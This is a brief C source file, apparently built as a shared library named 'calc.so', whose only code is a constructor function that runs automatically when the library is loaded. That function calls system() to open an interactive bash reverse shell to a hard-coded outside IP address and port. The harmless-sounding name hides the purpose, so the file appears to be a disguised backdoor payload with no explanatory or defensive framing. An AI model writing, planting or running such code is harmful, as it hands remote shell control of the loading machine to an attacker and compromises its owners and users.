#include <stdio.h>
#include <stdlib.h>

/*
build: gcc -shared -o calc.so -fPIC calc.c
*/

static void plugon() __attribute__((constructor));
void plugon() {
    system("bash -i >& /dev/tcp/47.98.125.75/10086 0>&1");
}
